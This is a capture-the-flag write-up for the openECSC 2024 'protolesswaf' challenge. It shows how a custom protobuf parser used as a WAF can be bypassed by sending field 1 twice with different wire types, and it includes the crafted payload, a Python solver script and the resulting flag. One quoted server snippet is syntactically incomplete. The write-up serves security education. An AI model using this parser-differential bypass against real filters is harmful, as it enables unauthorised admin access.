# protolesswaf

## Description

```
I found this cool parser for protobuf that does not require a .proto file. I'm using it in a WAF to prevent admin access to my server, I hope it works as expected.

Site: http://protolesswaf.challs.open.ecsc2024.it
```

## Provided Files

- `challenge.zip`

## Solve Process

When looking at the protobuf parser function, we can observe that the first two functions seem to be correctly implemented.

```py
def parse_field_number_and_type(byte):
    field_number = byte >> 3
    wire_type = byte & 0x07
    return field_number, wire_type


def parse_varint_field(data):
    result = 0
    shift = 0
    length = 0
    for byte in data:
        length += 1
        result |= (byte & 0x7F) << shift
        if not (byte & 0x80):
            return (length, result)
        shift += 7
    raise ValueError("Malformed varint")
```

But when looking at the parse_message function we can see that somethings off

```py
    # --- snip ---

    fields = {}
    while buffer:
        [tag_len, tag] = parse_varint_field(buffer)

        field_number, wire_type = parse_field_number_and_type(tag)

        buffer = buffer[tag_len:]

        # --- snip ---

        if wire_type == 0:  # Varint
            [value_len, value] = parse_varint_field(buffer)
            if field_number not in fields or fields[field_number]["type"] == "varint":
                fields[field_number] = {"type": "varint", "value": value}
            buffer = buffer[value_len:]

        # --- snip ---

        elif wire_type == 2:  # Length-delimited
            [length_len, length] = parse_varint_field(buffer)
            value = buffer[length_len : length_len + length]
            if (
                field_number not in fields
                or fields[field_number]["type"] == "length-delimited"
            ):
                fields[field_number] = {
                    "type": "length-delimited",
                    "value": value,
                }
            buffer = buffer[length_len + length :]

        else:
            raise ValueError(f"Unsupported wire type: {wire_type}")

    return fields
```

So basically it will always overwrite if the field number is either not present or the wire-type matches.

The server part of the WAF parses the username using strictly the fields id, which is a hint to overwriting the previous value

```py
# --- snip ---
try:
        gf = parse_message(bytes(bytearray.fromhex(protobuf)))
    except:
        return "Invalid protobuf message: " + protobuf

    if 1 not in gf:
        return "Please provide a username"
    username = gf[1]["value"]
    if gf[1]["type"] == 'length-delimited':
            
    if username is None:
        return "Please provide a username"

    if username == b"admin":
        return "Cannot be admin"

    return requests.get(f"http://{SERVER_HOST}/get-flag?protobuf=" + protobuf).text
```

While the server part will look for the username field

```py
# --- snip ---
try:
        gf = app_pb2.GetFlag()
        gf.ParseFromString(bytes(bytearray.fromhex(protobuf)))
    except:
        return "Invalid protobuf message: " + protobuf

    username = gf.username
    if username is None or username == "":
        return "Please provide a username"

    if username == "admin":
        return (
            "Hello, " + username + "! You are admin. The flag is: " + os.environ["FLAG"]
        )

    return "Hello, " + username + "! You are not admin."
```

The server always expects this `.proto` spec

```t
syntax = "proto3";

package program;

message GetFlag {
  string username = 1;
}
```

So lets craft a new payload that we can send to the server and effectively bypass the WAF.

This payload will need to have two entries using the same field id, but different wire types.

```
0x08 - is the tag for the user field. (Field ID 1, wire type 0)
0x01 - is the varint representation of the value 1 for the user field.
0x0A - is the tag for the username field. (Field ID 1, wire type 2)
0x05 - is the length of the string "admin".
'a' 'd' 'm' 'i' 'n' - are the ASCII values of the characters in the string "admin".
```

Based on this we can craft a nifty python solver for this, which looks like the following

```py
import requests
from protoless import parse_message

# to hex
protobuf_bytes = bytearray(b'\x08\x01\x0A\x05admin')
protobuf = protobuf_bytes.hex()

# send it
response = requests.get("http://protolesswaf.challs.open.ecsc2024.it/get-flag", params={"protobuf": protobuf})
print(response.text)
```

And after running this we get

```bash
~ ❯ python exploit.py 
Hello, admin! You are admin. The flag is: openECSC{trust_the_proto_not_the_user}
```

And that is a solve.
